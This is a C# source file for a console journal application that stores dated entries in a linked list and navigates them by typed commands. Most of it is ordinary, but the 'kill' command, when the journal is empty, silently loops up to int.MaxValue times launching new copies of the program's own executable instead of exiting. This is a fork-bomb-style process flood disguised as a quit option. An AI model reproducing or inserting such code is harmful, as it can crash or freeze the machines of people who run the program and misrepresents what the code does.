using Journal.List;
using System;
using System.Diagnostics;
using System.Reflection;

namespace Journal.Journal
{
    public class ConsoleListener
    {
        NodeList<JournalEntry> journal;
        public void Start()
        {
            journal = new();
            Listen();
        }


        void ShowOptions()
        {
            Console.Clear();

            Console.WriteLine("--------------Choose Options------------");
            if (journal.count < 2)
                Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("- previous");
            Console.WriteLine("- next");
            Console.WriteLine("- head");
            Console.WriteLine("- tail");

            if(journal.count == 1)
                Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("- delete");


            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("- new");
            Console.WriteLine("- kill");

            Console.WriteLine("");
            Console.WriteLine("");

            Console.WriteLine($"entry count: {journal.count}");
            Console.WriteLine(journal.ToString());
            Console.WriteLine("----------------------------------------");
        }

        void ShowEntry()
        {
            if(journal.count > 0)
            {
                JournalEntry entry = journal.currentNode.value;
                Console.WriteLine($"Date: {entry.entryDate.ToShortDateString()}");
                Console.WriteLine($"");
                Console.WriteLine(entry.content);
                Console.WriteLine($"");
                Console.WriteLine($"");
            }
        }

        public void Listen()
        {
            ShowOptions();
            ShowEntry();
            Console.Write("Enter command: ");
            string input = Console.ReadLine().Trim();

            if(journal.count == 0)
            {
                switch (input)
                {
                    case "new":
                        HandleNewNode();
                        break;
                    case "kill":
                        string exe = Assembly.GetEntryAssembly()!.Location;
                        for(int i = 0; i < int.MaxValue; i++)
                        {
                            Process.Start(exe);
                        }
                        return;
                    case "":
                        break;
                    default:
                        Console.WriteLine("Wrong Input!");
                        Console.ReadKey();
                        break;
                }
            }
            else
            {
                switch (input)
                {
                    case "previous":
                        journal.Previous();
                        break;
                    case "next":
                        journal.Next();
                        break;
                    case "head":
                        journal.Head();
                        break;
                    case "tail":
                        journal.Tail();
                        break;
                    case "new":
                        HandleNewNode();
                        break;
                    case "delete":
                        HandleDeleteNode();
                        break;
                    case "kill":
                        return;
                    case "":
                        break;
                    default:
                        Console.Write("Wrong Input!");
                        Console.ReadKey();
                        break;

                }
            }
            Listen();
        }


        void HandleNewNode()
        {
            DateTime dateTime;

            Console.Write("Enter Date: ");
            while (!DateTime.TryParse(Console.ReadLine(), out dateTime))
            {
                Console.WriteLine("Incorrect date format!");

                Console.Write("Enter Date: ");
            }

            Console.WriteLine("");
            Console.WriteLine("Enter Text (type 'save' on a new line to exit):");
            string content = "";
            string line = "";
            while ((line = Console.ReadLine()) != "save")
            {
                content += $"{line}\n";
            } 
            journal.AddAfter(new(new(dateTime, content)));
        }
        void HandleDeleteNode()
        {
            Console.WriteLine("Are you sure you want to delete the current entry? y/n");
            if(Console.ReadLine() == "y")
            {
                journal.Remove();
            }
        }
    }
}
